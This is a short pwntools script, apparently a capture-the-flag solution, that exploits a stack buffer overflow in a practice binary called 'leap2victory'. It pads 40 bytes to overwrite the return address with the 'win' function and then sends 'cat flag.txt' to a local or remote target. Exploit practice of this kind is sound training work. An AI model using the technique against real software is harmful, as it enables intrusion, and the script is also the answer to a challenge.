from pwn import *

context.terminal = ['gnome-terminal', '--', 'bash', '-c']
elf = context.binary = ELF('../public/leap2victory')

remote_addr = args.REMOTE_ADDR or 'localhost'
remote_port = args.REMOTE_PORT or 1337

if args.LOCAL:
    r = process()
else:
    r = remote(remote_addr, remote_port)

if args.LOCAL and not args.NO_GDB:
    gdb.attach(r)

# payload = cyclic(64)
eip_offset = 32+4+4

payload = flat(
    b'A'*eip_offset,
    elf.sym['win']
)

print(r.recvline())
r.sendline(payload)

# r.interactive()
r.sendline('cat flag.txt')
r.sendline('exit')

flag = r.recvall().decode().strip()
print(flag)

r.close()
